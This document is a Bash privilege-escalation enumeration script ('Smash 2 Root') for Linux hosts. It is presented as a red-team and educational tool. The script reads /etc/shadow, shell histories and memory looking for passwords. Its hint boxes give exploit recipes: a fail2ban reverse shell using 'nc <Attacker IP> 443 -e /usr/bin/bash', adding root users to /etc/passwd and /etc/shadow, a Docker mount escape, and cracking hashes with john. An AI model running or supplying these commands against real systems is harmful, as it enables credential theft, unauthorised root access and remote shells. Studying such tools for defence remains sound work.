#!/bin/bash


#------------------> Color Code:
RED="\033[01;31m"
BLUE="\033[36m"
GREEN="\033[01;32m"
GRAY="\e[0;37m"
YELLOW='\e[1;93m'
XX="\033[0m" #--- Close COLOR
#------------------> Clear Screen:
echo -e "\n\n${RED}╚════{ Clearing Terminal${XX}"
sleep 0.5
clear 
echo -e "\n\n${GREEN}╚════{ Loading Script...${XX}"
sleep 2
clear
#------------------> Banner:
echo -e "\n"
echo -e "\n"
echo -e "
                ▄▄▄▄▄▄▄▄▄▄▄▄
              ████████████████
            ███████████████████
          ▐██████████████████████           
            ▀▀▀▀████████████▀▀▀▀             ██████╗███╗   ███╗ █████╗  ██████╗██╗  ██╗     ██████╗      ██████╗  █████╗  █████╗ ████████╗
      ▄▄▄██                      ██▄▄▄      ██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║     ╚════██╗     ██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝ 
  ██████████▄▄▄▄▄▄        ▄▄▄▄▄▄██████████  ╚█████╗ ██╔████╔██║███████║╚█████╗ ███████║       ███╔═╝     ██████╔╝██║  ██║██║  ██║   ██║
        ▀▀▀██████████████████████▀▀▀         ╚═══██╗██║╚██╔╝██║██╔══██║ ╚═══██╗██╔══██║     ██╔══╝       ██╔══██╗██║  ██║██║  ██║   ██║
                                            ██████╔╝██║ ╚═╝ ██║██║  ██║██████╔╝██║  ██║     ███████╗     ██║  ██║╚█████╔╝╚█████╔╝   ██║
           █                  █             ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝     ╚══════╝     ╚═╝  ╚═╝ ╚════╝  ╚════╝    ╚═╝
            █    ██▀▀▀▀██    █              ═════════════════════════════════════════════════════════{Privilege Escalation Script v3.5}
             █  ▀        ▀  █
              ██▄████████▄██
                ▀████████▀
                   ████
"
sleep 1
echo -e "\n${BLUE}Nᴏᴛᴇ:${XX}"
echo -e "\tTʜᴇ sᴄʀɪᴘᴛ ʜᴀs ʙᴇᴇɴ ᴅᴇsɪɢɴᴇᴅ ᴛᴏ sᴜᴘᴘᴏʀᴛ SOC, Rᴇᴅ Tᴇᴀᴍ ᴏʀ ɪᴛ ᴄᴀɴ ʙᴇ ᴜsᴇ ғᴏʀ ᴇᴅᴜᴄᴀᴛɪᴏɴᴀʟ ᴘᴜʀᴘᴏsᴇs ɪɴ"
echo -e "\tғɪɴᴅɪɴɢ sʏsᴛᴇᴍ ᴠᴜʟɴᴇʀᴀʙɪʟɪᴛɪᴇs ᴛʜᴀᴛ ᴍᴀʏ ʟᴇᴀᴅ ᴛᴏ ᴘʀɪᴠɪʟᴇɢᴇ ᴇsᴄᴀʟᴀᴛɪᴏɴ. Tʜᴇ sᴄʀɪᴘᴛ sʜᴏᴜʟᴅ ʙᴇ ᴜsᴇᴅ ɪɴ"
echo -e "\tsᴀғᴇ ᴇɴᴠɪʀᴏɴᴍᴇɴᴛ. Tʜᴇ ᴀᴜᴛʜᴏʀ ɪs ɴᴏᴛ ʀᴇsᴘᴏɴsɪʙʟᴇ ғᴏʀ ᴀɴʏ ᴍɪsᴜsᴇ ᴏғ ɪᴛ. ᴛʜᴇʀᴇғᴏʀ ʙʏ ʀᴇᴀᴅɪɴɢ ᴛʜɪs,"
echo -e "\tʏᴏᴜ ᴛᴀᴋᴇ ғᴜʟʟ ʀᴇsᴘᴏɴsɪʙɪʟɪᴛʏ ᴏғ ᴍɪsᴜsɪɴɢ ɪᴛ."
sleep 1
echo -e "\n${BLUE}Aᴜᴛʜᴏʀ:${XX}"
sleep 0.1
echo -e "\t     Iʀᴏɴ Hᴜʟᴋ"
echo -e "\tMᴀɴ Iɴ A Bʟᴀᴄᴋ Tᴜxᴇᴅᴏ"  
sleep 0.1
echo -e "\n${BLUE}Mᴇssᴀɢᴇ:${XX}"
sleep 0.1
echo -e "\tAʟʟ ᴛʜᴇ ᴇxᴘʟᴏɪᴛs ʜᴀᴠᴇ ʙᴇᴇɴ ʟɪsᴛᴇᴅ ʙᴀsᴇᴅ ᴏɴ ᴛʜᴇ ᴀᴜᴛʜᴏʀ's ᴏᴘɪɴɪᴏɴ, ʏᴏᴜ ᴍᴀʏ ᴜsᴇ ᴀɴʏ ᴏғ ʏᴏᴜʀ ᴄʜᴏɪᴄᴇ. Rᴇᴍᴇᴍᴇʙʀ, SKY HAS NO LIMITS :)"
sleep 0.1
echo -e "\n${BLUE}Rᴇᴄᴏᴍᴍᴇɴᴅᴀᴛɪᴏɴ:${XX}"
sleep 0.1
echo -e "\tNᴇᴠᴇʀ ʀᴇʟᴀʏ ᴏɴ ᴀ sɪɴɢʟᴇ ᴛᴏᴏʟ, & ᴅᴏ ᴍᴀɴᴜᴀʟ ᴇɴᴜᴍᴇʀᴀᴛɪᴏɴ."
sleep 0.1
echo -e "\n${BLUE}Sᴄᴀɴ Sᴛᴀʀᴛᴇᴅ Aᴛ:${XX}"
echo -e "\t"; date
echo -e "\n\n${RED}\t\tEnumeration on progress ╔═..................................(1%)......................................${XX}\n"
echo -e "\n"
sleep 2
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ════════════════════════════════════════[ Current User Information ]════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
echo -e "\n${BLUE}╔═════{ Current Privilege is?${XX}"
    root () { [ "$(id -u)" -eq 0 ]; }
    if root;
        then
            echo -e "${GREEN}        You are Root!${XX}"
            echo -e "\n"
            read -p "[+] Continue Enumeration (y/n)? " input
            if [[ $input == "n" ]]; then
                exit 1
            fi
        else
            echo -e "\tNormal User, too bad :(... " >&2
            echo -e "\tTry hard to escalate :D "
            sleep 2
    fi
echo -e "\n${BLUE}╔═════{ Current user is:${XX}"
    whoami | grep -i $USER 
echo -e "\n${BLUE}╔═════{ Sudo privileged access:${XX}"
    sudo -ln | grep -E --color=always 'NOPASSWD|ALL|$'
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Incase you have the password, run: sudo -l and find a way to exploit the file.                                      ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Who's logged in:${XX}"
    w
echo -e "\n${BLUE}╔═════{ Login History:${XX}"
    last -Faiw | last | grep still --color=always
echo -e "\n${BLUE}╔═════{ Last Log In:${XX}"
    lastlog | grep -v "**Never logged in**" 
echo -e "\n${BLUE}╔═════{ Root Users:${XX}"
    awk -F: '($3 == '0') {print}' /etc/passwd | grep root --color=always
echo -e "\n${BLUE}╔═════{ Users with console:${XX}"
    cat /etc/passwd | grep --color=always '/bin/bash\|/bin/sh\|/bin/zsh'
echo -e "\n${BLUE}╔═════{ Total number of users:${XX}"
    getent passwd | wc -l
echo -e "\n${BLUE}╔═════{ Can we read other user's history files?${XX}"
    find / -iname *.*history* -print 2>/dev/null | xargs ls -la
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Have a look at history files, they might have sensitive information.                                                ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Are we in a restricted shell?${XX}"
    env | grep -i "rbash\|chroot"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Bypass Restricted Shell:                                                                                            ║"
        echo -e "\t║    https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/                                             ║"
        echo -e "\t║    https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf                           ║"
        echo -e "\t║If non of the above worked, try:                                                                                    ║"
        echo -e "\t║    echo '$'PATH                                                                                                    ║"
        echo -e "\t║    ls the directory and find an exploit                                                                            ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ which users have recently used sudo:${XX}"
    if [ -r /var/log/auth.log ];
        then
            cat /var/log/auth.log
        else
            echo -e "${RED}	Permission Denied${XX}"
    fi
echo -e "\n${BLUE}╔═════{ User ID:${XX}"
    id
echo -e "\n${BLUE}╔═════{ User Groups:${XX}"
    groups
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Sometimes, the user may be a part of a vulnerable group such as: lxd/lxc,Docker, Wheel, Shadow, Disk, Video, etc.   ║"
        echo -e "\t║Every group worths Googling for exploit.                                                                            ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Are we in Docker:${XX}"
    find / -iname *.dockerenv -type f 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Escape the Docker container: Run fdisk -l to make sure wich drive to mount                                          ║"
        echo -e "\t║    mkdir /hdd && mount /dev/sda1 /hdd && chroot /hdd                                                               ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ User ID & Groups possible escap:${XX}"
    id | grep --color=always -i "docker\|lxd\|auth\|lpadmin\|adm\|sudo\|video\|disk\|disk\|shadow\|fail2ban\|samashare" 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Docker:                                                                                                             ║"
        echo -e "\t║Run:                                                                                                                ║"
        echo -e "\t║    1) docker image ls                                                                                              ║"
        echo -e "\t║    2) docker run -v /:/mnt --rm -it <Image_Name> chroot /mnt sh                                                    ║"
        echo -e "\t║https://gtfobins.github.io/gtfobins/docker/                                                                         ║"
        echo -e "\t║https://www.hackingarticles.in/docker-privilege-escalation/                                                         ║"
        echo -e "\t║https://fosterelli.co/privilege-escalation-via-docker.html                                                          ║"
        echo -e "\t║https://medium.com/@anushibin007/ha-chakravyuh-vulnhub-walkthrough-2be29373722a                                     ║"
        echo -e "\t║====================================================================================================================║"
        echo -e "\t║LXD/LXC:                                                                                                            ║"
        echo -e "\t║https://www.hackingarticles.in/lxd-privilege-escalation/                                                            ║"
        echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/                              ║"
        echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation    ║"
        echo -e "\t║====================================================================================================================║"
        echo -e "\t║Samashare:                                                                                                          ║"
        echo -e "\t║https://www.securityfocus.com/bid/9619/exploit                                                                      ║"
        echo -e "\t║====================================================================================================================║"
        echo -e "\t║lpadmin:                                                                                                            ║"
        echo -e "\t║Members of lpadmin can read /var/run/cups/certs/0. With this key it is possible to access the cups web interface as ║"
        echo -e "\t║admin. You can edit the cups config file and set the page log to any filename you want (for example /etc/shadow).   ║"
        echo -e "\t║Then you can read the file contents by viewing the cups page log. By printing you can also write some random data   ║"
        echo -e "\t║to the given file.                                                                                                  ║"
        echo -e "\t║Exploit:                                                                                                            ║"
        echo -e "\t║https://www.exploit-db.com/exploits/43418                                                                           ║"
        echo -e "\t║Read More:                                                                                                          ║"
        echo -e "\t║https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692791                                                            ║"
        echo -e "\t║====================================================================================================================║"
        echo -e "\t║sudo/admin:                                                                                                         ║"
        echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                     ║"
        echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                             ║"
        echo -e "\t║====================================================================================================================║"
        echo -e "\t║Video:                                                                                                              ║"
        echo -e "\t║The video group can be used locally to give a set of users access to a video device or to the screen output.        ║"
        echo -e "\t║This could be exploit d by taking a screenshot of the current screen output and gathering any private information   ║"
        echo -e "\t║such as user passwords or hashes.                                                                                   ║"
        echo -e "\t║Esc from video:-                                                                                                    ║"
        echo -e "\t║https://github.com/frizb/Linux-Privilege-Escalation                                                                 ║"
        echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                     ║"
        echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                             ║"
        echo -e "\t║====================================================================================================================║"
        echo -e "\t║Disk:                                                                                                               ║"
        echo -e "\t║The disk group provides users with access to the raw data contained in disks and partitions.                        ║"
        echo -e "\t║Esc from disk:-                                                                                                     ║"
        echo -e "\t║https://github.com/frizb/Linux-Privilege-Escalation                                                                 ║"
        echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                     ║"
        echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                             ║"
        echo -e "\t║====================================================================================================================║"
        echo -e "\t║Shadow:                                                                                                             ║"
        echo -e "\t║Since users in this group have access to view the /etc/shadow file, this can be exploit d by cracking password      ║"
        echo -e "\t║hashes found in it.                                                                                                 ║"
        echo -e "\t║Esc from shadow:-                                                                                                   ║"
        echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                     ║"
        echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                             ║"
        echo -e "\t║====================================================================================================================║"
        echo -e "\t║Adm:                                                                                                                ║"
        echo -e "\t║Usually members of the group adm have permissions to read log files located inside /var/log/. take a look :D        ║"
        echo -e "\t║====================================================================================================================║"
        echo -e "\t║fial2ban:                                                                                                           ║"
        echo -e "\t║File2Ban Enumeration:                                                                                               ║"
        echo -e "\t║    ls -l /etc/fail2ban/                                                                                            ║"
        echo -e "\t║    cat /etc/fail2ban/README.fox                                                                                    ║"
        echo -e "\t║    ls -l /etc/fail2ban/action.d (Do we have write permissions)                                                     ║"
        echo -e "\t║Reverse Shell: ** PUT SED COMMAND IN ONE LINE **                                                                    ║"
        echo -e "\t║    which nc bash sh                                                                                                ║"
        echo -e "\t║Way1)                                                                                                               ║"
        echo -e "\t║    sed -i 's:actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>:actionban = nc <Attacker IP> 443 -e     ║"
        echo -e "\t║    /usr/bin/bash:g' /etc/fail2ban/action.d/iptables-multiport.conf                                                 ║"
        echo -e "\t║Way2) create a cron job as root:                                                                                    ║"
        echo -e "\t║    sed -i 's:actionban = nc <Attacker IP> 443 -e /usr/bin/bash:actionban = echo '*  *  *  *  * root nc             ║"
        echo -e "\t║    <Attacker IP> 443 -e /usr/bin/bash' >> /etc/crontab:g' /etc/fail2ban/action.d/iptables-multiport.conf           ║"
        echo -e "\t║https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7   ║"
        echo -e "\t║====================================================================================================================║"
        echo -e "\t║auth:                                                                                                               ║"
        echo -e "\t║https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot                      ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ══════════════════════════════════[ Password File Permission & Users ]══════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║<Username>:<Password>:<UserID>:<GroupID>:<GecosField>:<HomeDirectory>:<Shell>                                       ║"
        echo -e "\t║If an -x- is representing the password field, this indicates that the password is encrypted.                        ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Password file:${XX}"
    ls -la /etc/passwd --color=always
echo -e "\n${BLUE}╔═════{ Password in history files:${XX}"
echo -e "\n${BLUE}    ══{ .bash_history${XX}"
    if [ -f ~/.bash_history ]; 
        then
            cat ~/.bash_history | grep "pass" 2>/dev/null
        else
            echo -e "  ${RED}File does not exist${XX}"
    fi
echo -e "\n${BLUE}    ══{ .zsh_history${XX}"
    if [ -f ~/.zsh_history ]; 
        then
            cat ~/.zsh_history | grep "pass" 2>/dev/null
        else
            echo -e "  ${RED}File does not exist${XX}"
    fi
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║The bash_history file is used to store the command history of a particular user. The bash_history file can be       ║"
        echo -e "\t║configured in the .bashrc configuration file that is stored in the home directory of a user.                        ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}    ══{ Is Password file Writable?${XX}"
    passwd=/etc/passwd
    [ $# -eq 0 ]
        if [ -w "$passwd" ] 
        then
        echo -e "${GREEN}	Permission is Granted${XX}"
                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║${RED}Exploit:${XX}                                                                                                            ║"
                echo -e "\t║${RED}First, generate a password with one of the following commands:${XX}                                                      ║"
                echo -e "\t║    ${RED}openssl passwd -1 -salt hulk password${XX}                                                                           ║"
                echo -e "\t║    ${RED}perl -le 'print crypt(hulk, password)'${XX}                                                                          ║"
                echo -e "\t║${RED}Rewrite the password file:${XX}                                                                                          ║"
                echo -e "\t║    ${RED}echo 'hulk:HASH:0:0::/root:/bin/bash' >> /etc/passwd${XX}                                                            ║"
                echo -e "\t║${RED}Then do: su hulk${XX}                                                                                                    ║"
                echo -e "\t║Read more:                                                                                                          ║"
                echo -e "\t║    https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/                                ║"
                echo -e "\t║Protect the file by limiting the access to it:                                                                      ║"
                echo -e "\t║    chmod 644 /etc/passwd                                                                                           ║"
                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        else
        echo -e "${RED}	Permission Denied${XX}"
        fi
echo -e "\n${BLUE}    ══{ Reading Password File:${XX}"
    if [ -r /etc/passwd ];
    then
        cat /etc/passwd | grep -E ":0:0:|$"
    else
        echo -e "${RED}	Permission Denied${XX}"
    fi
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║All linux systems will print this information, our aim is to find hash value to be cracked or write permission to   ║"
        echo -e "\t║missuse it.                                                                                                         ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}    ══{ Hash in Password file:${XX}"
    grep  -v 'x' /etc/passwd
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If any hash is found in the /etc/passwd, the attacker my try to crack it by using any hash cracker software or tool ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Shadow file:${XX}"
    ls -la /etc/shadow --color=always
echo -e "\n${BLUE}    ══{ Is Shadow file Writable?${XX}"
    shadow=/etc/shadow
    [ $# -eq 0 ]
        if [ -w "$shadow" ] 
            then
                echo -e "${GREEN}	Permission is Granted${XX}"
                        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                        echo -e "\t║${RED}Exploit:${XX}                                                                                                            ║"
                        echo -e "\t║1) Generate a new Shadow Hash and replace it with the current root hash:                                            ║"
                        echo -e "\t║    - mkpasswd  -m sha-512 -S prove123 -s                                                                           ║"
                        echo -e "\t║2) Open the shadow file using any text editor of your choice:                                                       ║"
                        echo -e "\t║    or copy your HASH from your system and replace it with the root hash                                            ║"
                        echo -e "\t║3) Login to root using your password                                                                                ║"
                        echo -e "\t║4) Or Simply do:                                                                                                    ║"
                        echo -e "\t║    echo 'privesc:Npge08pfz4wuk:0:0:privesc,,,:/:/bin/bash' >> /etc/shadow                                          ║"
                        echo -e "\t║    This adds a root privilege user 'privesc' with the password 'password'                                          ║"
                        echo -e "\t║Read More:                                                                                                          ║"
                        echo -e "\t║    https://linuxize.com/post/etc-shadow-file/                                                                      ║"
                        echo -e "\t║    https://blog.geoda-security.com/2019/02/privilege-escalation-exploiting-write.html                              ║"
                        echo -e "\t║Protect the file by limiting the access to it:                                                                      ║"
                        echo -e "\t║    chmod 600 /etc/shadow                                                                                           ║"
                        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
            else
                echo -e "${RED}	Permission Denied${XX}"
            fi
echo -e "\n${BLUE}    ══{ Reading shadow File:${XX}"
    if [ -r /etc/shadow ];
    then
        cat /etc/shadow
        echo -e "\n${BLUE}    ══{ Hash in Shadow file: (Interesting :D)${XX}"
            grep  -v '*:\|!:' /etc/shadow
            echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
            echo -e "\t║Crack the hash using online website or any cracking tools or run this on the target machine:                        ║"
            echo -e "\t║    ${RED}unshadow /etc/passwd /etc/shadow > shadow.john${XX}                                                                  ║"
            echo -e "\t║    ${RED}john shadow.john --wordlist=<WORLD_LIST>${XX}                                                                        ║"
            echo -e "\t║You may also crack the hash by copying the hash or shadow.john file to your OS and do:                              ║"
            echo -e "\t║    ${RED}john –wordlist=<WORLD_LIST> hash${XX}                                                                                ║"
            echo -e "\t║If you own the system and have root, you can use MimiPenguin to crack it:                                           ║"
            echo -e "\t║    https://github.com/huntergregal/mimipenguin                                                                     ║"
            echo -e "\t║    https://github.com/sevagas/swap_digger                                                                          ║"
            echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
    else
        echo -e "${RED}	Permission Denied${XX}"
    fi
echo -e "\n${BLUE}╔═════{ Sudoers File:${XX}"
    ls -la /etc/sudoers --color=always
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║<Username> <All terminal>=<All user>:<All Group> <comand to execute>                                                ║"
        echo -e "\t║Read more:                                                                                                          ║"
        echo -e "\t║    https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d            ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}    ══{ Is Sudoers file Writable?${XX}"
    sudoers=/etc/sudoers
    [ $# -eq 0 ]
        if [ -w "$sudoers" ] 
            then
                echo -e "${GREEN}   Permission is Granted${XX}"
            else
                echo -e "${RED}	Permission Denied${XX}"
            fi
echo -e "\n${BLUE}    ══{ Reading Sudoers File:${XX}"
    if [ -r /etc/sudoers ];
        then
            cat /etc/sudoers | grep -E --color=always 'ALL|$'
                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║The sudo command allows non root users to run commands that would normally require super user privileges. If the    ║"
                echo -e "\t║running file or the application has a global vulnerability or file permission misconfiguration, the attacker may    ║"
                echo -e "\t║google the vulnerability or abuse the file for user escalation.                                                     ║"
                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        else
        echo -e "${RED}	Permission Denied${XX}"
    fi
echo -e "\n${BLUE}╔═════{ User Group list:${XX}"
    ls -la /etc/group --color=always
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║It stores group information or defines the user groups i.e. it defines the groups to which users belong.            ║"
        echo -e "\t║Read more:                                                                                                          ║"
        echo -e "\t║  https://www.cyberciti.biz/faq/understanding-etcgroup-file/                                                        ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}    ══{ Content of User Group list:${XX}"
    cat /etc/group 
echo -e "\n${BLUE}╔═════{ Password Policy:${XX}"
    grep --color=always "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Read more:                                                                                                          ║"
        echo -e "\t║  https://www.linuxfordevices.com/tutorials/linux/linux-password-policies                                           ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ═══════════════════════════════════════[ Credentials Harvesting ]═══════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║To list all files having the word password/credentials/hash do the following manually:                              ║"
        echo -e "\t║${RED}grep -rn -i 'pass\|cred\|hash' / --color=always > password.txt${XX}                                                      ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Find 'Pass, Hash, Cred' as a file name:${XX}"
    find / -iname "*pass*" -o -iname "*hash*" -o -iname "*cred*" 2>/dev/null | xargs ls -ld 2>/dev/null --color=always | grep -v "/usr/\|/var/\|/opt/\|/sys/"
        echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e  "\t║Excluded: /usr/ | /var/ | /opt/ | /sys/                                                                             ║"
        echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Bash History Files:${XX}"
    find / -iname *_history -xdev 2>/dev/null | xargs ls -ld
echo -e "\n${BLUE}╔═════{ Curent User Bash History:${XX}"
echo -e "\n${BLUE}    ══{ .bash_history:${XX}"
        if [ -f /home/$USER/.bash_history ]; 
            then
                echo -e "\n${BLUE}    ══{ Reading last 100 User Bash History:${XX}"
                tail -n 100 /home/$USER/.bash_history 2>/dev/null
                    echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                    echo -e  "\t║If you want to read the whole file do: cat ~/.bash_history                                                          ║"
                    echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
            else
                echo -e "${RED}	File does not exist${XX}"
        fi
echo -e "\n${BLUE}    ══{ .zsh_history:${XX}"
        if [ -f /home/$USER/.zsh_history ]; 
            then
                echo -e "\n${BLUE}    ══{ Reading last 100 User Bash History:${XX}"
                tail -n 100 /home/$USER/.zsh_history 2>/dev/null
                    echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                    echo -e  "\t║If you want to read the whole file do: cat ~/.zsh_history                                                           ║"
                    echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
            else
                echo -e "${RED}	File does not exist${XX}"
        fi
        echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e  "\t║Bash and other scripting languages, along with various services often store previous commands run in the system,    ║"
        echo -e  '\t║which could contain clear-text or encoded passwords if they are hard-coded in the command itself                    ║'
        echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ User Nano History:${XX}"
    if [ -f /home/$USER/.nano_history ]; 
        then
            echo -e "\n${BLUE}    ══{ Reading User Nano History:${XX}"
            cat /home/$USER/.nano_history
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ User FTP History:${XX}"
    if [ -f /home/$USER/.atftp_history ]; 
        then
            echo -e "\n${BLUE}    ══{ Reading User FTP History:${XX}"
            cat /home/$USER/.atftp_history
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ User MYSQL History:${XX}"
    if [ -f /home/$USER/.mysql_history ]; 
        then
            echo -e "\n${BLUE}    ══{ Reading User MYSQL History:${XX}"
            cat /home/$USER/.mysql_history
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ User PHP History:${XX}"
    if [ -f /home/$USER/.php_history ]; 
        then
            echo -e "\n${BLUE}    ══{ Reading User PHP History:${XX}"
            cat /home/$USER/.php_history
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ /etc/security/opasswd file permission:${XX}"
    ls -la /etc/security/opasswd
echo -e "\n${BLUE}╔═════{ Reading old passwords in /etc/security/opasswd:${XX}"
    if [ -r /etc/security/opasswd ];
        then
            cat /etc/security/opasswd
                echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e  "\t║The /etc/security/opasswd file is used by pam_cracklib (a module used in Linux to ensure a good password policy is  ║"
                echo -e  '\t║in place) to store the hashed version of old passwords used on the system to prevent users from reusing the same    ║'
                echo -e  '\t║over and over again.                                                                                                ║'
                echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
            else
        echo -e "${RED}	Permission Denied${XX}"
    fi
echo -e "\n${BLUE}╔═════{ In memory passwords:${XX}"
    strings /dev/mem -n10 | grep -i PASS 2>/dev/null
        echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e  "\t║Services will sometimes store the credentials entered by the end user in clear text in memory. The commands below   ║"
        echo -e  '\t║can help find credentials stored in processes                                                                       ║'
        echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Password Files:${XX}"
    find / -iname passwd -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
        echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e  "\t║Read the following files, they might have password or hash in them.                                                 ║"
        echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
